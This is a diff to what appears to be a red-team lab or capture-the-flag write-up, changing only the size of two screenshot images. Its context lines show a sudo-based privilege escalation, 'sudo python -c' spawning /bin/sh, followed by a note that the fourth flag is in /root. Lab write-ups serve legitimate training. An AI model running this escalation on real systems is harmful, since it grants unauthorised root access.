@@ -148,11 +148,10 @@ Command: sudo -l
 
 Command: sudo python -c 'import os; os.system("/bin/sh")'
 
-<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Root_1.png" width=50% height=50%>
+<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Root_1.png" width=40% height=40%>
 
 **Flag 4**
 
 Location: /root
 
-<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Root_2.png" width=50% height=50%>
-
+<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Root_2.png" width=40% height=40%>
